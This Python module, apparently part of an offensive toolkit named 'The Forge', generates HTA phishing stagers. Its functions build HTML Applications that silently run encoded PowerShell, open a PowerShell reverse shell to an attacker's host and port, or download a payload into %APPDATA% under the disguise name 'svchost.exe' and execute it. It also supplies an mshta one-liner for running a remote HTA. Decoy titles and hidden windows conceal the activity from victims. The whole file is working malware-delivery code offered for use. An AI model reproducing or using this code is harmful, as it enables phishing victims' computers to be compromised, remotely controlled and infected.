"""
The Forge — HTA Stager
HTML Application stagers for phishing delivery.
"""

import base64
import textwrap


def generate_hta_powershell(command: str, title: str = "Please wait...") -> str:
    """HTA file that executes a PowerShell command silently."""
    # Encode the PS command
    ps_encoded = base64.b64encode(command.encode("utf-16-le")).decode()

    return textwrap.dedent(f"""\
        <html>
        <head>
        <title>{title}</title>
        <HTA:APPLICATION
            APPLICATIONNAME="{title}"
            SCROLL="no"
            SINGLEINSTANCE="yes"
            SHOWINTASKBAR="no"
            WINDOWSTATE="minimize"
        />
        </head>
        <body>
        <script language="VBScript">
            Sub Window_OnLoad
                Dim objShell
                Set objShell = CreateObject("WScript.Shell")
                objShell.Run "powershell -nop -w hidden -enc {ps_encoded}", 0, False
                self.close
            End Sub
        </script>
        <p>Loading document, please wait...</p>
        </body>
        </html>
    """)


def generate_hta_reverse_shell(host: str, port: int, title: str = "Document Viewer") -> str:
    """HTA that launches a PowerShell reverse shell."""
    ps_code = textwrap.dedent(f"""\
        $client=New-Object System.Net.Sockets.TCPClient("{host}",{port});
        $stream=$client.GetStream();
        [byte[]]$bytes=0..65535|%{{0}};
        while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{
            $data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
            $sendback=(iex $data 2>&1|Out-String);
            $sendback2=$sendback+"PS "+(pwd).Path+"> ";
            $sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);
            $stream.Write($sendbyte,0,$sendbyte.Length);
            $stream.Flush()
        }};
        $client.Close()
    """).strip()

    return generate_hta_powershell(ps_code, title)


def generate_hta_download_exec(url: str, output_name: str = "svchost.exe", title: str = "Update") -> str:
    """HTA that downloads and executes a payload."""
    return textwrap.dedent(f"""\
        <html>
        <head>
        <title>{title}</title>
        <HTA:APPLICATION SHOWINTASKBAR="no" WINDOWSTATE="minimize"/>
        </head>
        <body>
        <script language="VBScript">
            Sub Window_OnLoad
                Dim oShell, oHTTP, oStream, sPath
                Set oShell = CreateObject("WScript.Shell")
                sPath = oShell.ExpandEnvironmentStrings("%APPDATA%") & "\\{output_name}"
                
                Set oHTTP = CreateObject("MSXML2.XMLHTTP")
                oHTTP.Open "GET", "{url}", False
                oHTTP.Send
                
                Set oStream = CreateObject("ADODB.Stream")
                oStream.Type = 1
                oStream.Open
                oStream.Write oHTTP.ResponseBody
                oStream.SaveToFile sPath, 2
                oStream.Close
                
                oShell.Run sPath, 0, False
                self.close
            End Sub
        </script>
        <p>Loading, please wait...</p>
        </body>
        </html>
    """)


def generate_hta_mshta_oneliner(hta_url: str) -> str:
    """One-liner to execute remote HTA via mshta.exe."""
    return f'mshta.exe "{hta_url}"'


# ---------------------------------------------------------------------------
# Master Generator
# ---------------------------------------------------------------------------

VARIANTS = {
    "powershell": generate_hta_powershell,
    "reverse_shell": generate_hta_reverse_shell,
    "download_exec": generate_hta_download_exec,
}


def generate(variant: str = "reverse_shell", **kwargs) -> str:
    gen_func = VARIANTS.get(variant.lower())
    if not gen_func:
        raise ValueError(f"Unknown variant: {variant}. Available: {list(VARIANTS.keys())}")
    return gen_func(**kwargs)


def list_variants() -> list[str]:
    return list(VARIANTS.keys())
